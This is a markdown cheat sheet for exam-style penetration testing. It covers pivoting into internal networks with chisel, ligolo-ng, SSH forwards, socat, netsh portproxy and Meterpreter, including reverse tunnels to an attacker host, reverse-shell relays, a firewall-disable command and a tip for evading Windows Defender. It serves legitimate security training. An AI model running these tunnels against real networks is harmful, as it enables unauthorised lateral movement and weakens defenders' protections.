# Pivoting, Tunneling & Port Forwarding

## Why pivoting matters

Exam AD sets often place:

- One host dual-homed (reachable from exam network **and** internal LAN)
- DC / secondary hosts only on the **internal** network

Without a tunnel, you cannot scan or exploit the rest of the set from Kali.

```text
[Kali] ----entry net---- [dual-homed pivot] ----internal---- [app host] [DC]
```

## Concept map

| Technique | Use when |
|-----------|----------|
| Dynamic SOCKS (chisel/ligolo/ssh -D) | Need many tools through pivot |
| Local port forward | Reach one internal service on localhost |
| Remote port forward | Expose internal service back to Kali |
| socat / plink | Quick TCP redirects |

---

## Chisel

### Attacker (Kali)

```bash
./chisel server -p 8001 --reverse
```

### Victim (Windows/Linux)

```cmd
chisel.exe client KALI:8001 R:1080:socks
```

```bash
./chisel client KALI:8001 R:1080:socks
```

### Use SOCKS

```bash
# /etc/proxychains4.conf
# socks5 127.0.0.1 1080
proxychains -q nmap -Pn -sT -p 445,3389,5985 172.16.x.x
proxychains -q nxc smb 172.16.x.0/24 -u user -p pass
proxychains -q evil-winrm -i 172.16.x.x -u user -p pass
```

**Note:** Through SOCKS, use **TCP connect scans** (`-sT`), not default SYN, unless using advanced tooling.

---

## ligolo-ng (modern preferred by many 2025–2026 candidates)

Ligolo creates a TUN interface — many tools work **without** proxychains.

```bash
# Attacker
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert

# Agent on victim
./agent -connect KALI:11601 -ignore-cert

# In ligolo console: session → start
sudo ip route add 172.16.x.0/24 dev ligolo
```

Then nmap/nxc as if you were on the internal network.

---

## SSH pivoting

```bash
# Dynamic SOCKS via compromised Linux SSH
ssh -D 1080 user@pivot

# Local forward: Kali:8443 → internal:443 via pivot
ssh -L 8443:internal:443 user@pivot

# Remote forward: expose Kali listener to internal hosts
ssh -R 443:127.0.0.1:443 user@pivot
```

---

## socat

```bash
# Forward pivot:445 → internalDC:445
socat TCP-LISTEN:445,fork TCP:172.16.x.100:445
```

---

## Windows-native helpers

```cmd
# netsh portproxy (admin)
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8443 \
  connectaddress=172.16.x.20 connectport=5985
```

```powershell
# SSH client exists on modern Windows
ssh -R 1080 user@kali
```

---

## Meterpreter / MSF pivoting (if allowed)

```text
portfwd add -l 3389 -p 3389 -r 172.16.x.x
route add 172.16.x.0 255.255.255.0 -1
# + socks module
```

Prefer non-MSF methods unless you are sure of exam rules.

---

## Double hop reverse shells

If an internal host can reach the pivot but not Kali:

1. Listener on Kali
2. Remote forward pivot → Kali:443 or chisel reverse
3. Shell from internal host to pivot:443 which lands on Kali

Or: reverse shell to the pivot, then `nc` relay.

---

## Practical exam order

1. Own dual-homed host (SYSTEM preferred)
2. Confirm routes: `route print` / `ip route`
3. Stand up **ligolo or chisel** immediately
4. Re-run discovery on internal CIDR
5. Only then attack internal hosts / DC “from Kali”

```cmd
# On Windows pivot
route print
ipconfig /all
arp -a
```

```bash
# From Kali through tunnel
nmap -Pn -sT --top-ports 100 172.16.x.0/24
```

---

## Firewall notes

```cmd
# Lab convenience only (noisy)
netsh advfirewall set allprofiles state off
```

Prefer specific allow rules when possible.

---

## Troubleshooting

| Symptom | Check |
|---------|--------|
| SOCKS works for curl, not nmap | Use `-sT`, proxychains config type socks5 |
| Kerberos fails through pivot | DNS + clock still correct; use IP + NTLM if needed |
| Agent connects, no traffic | Routes on Kali to internal via TUN/SOCKS |
| Windows Defender kills chisel | Rename, different dir, alternate tool (ligolo, ssh) |
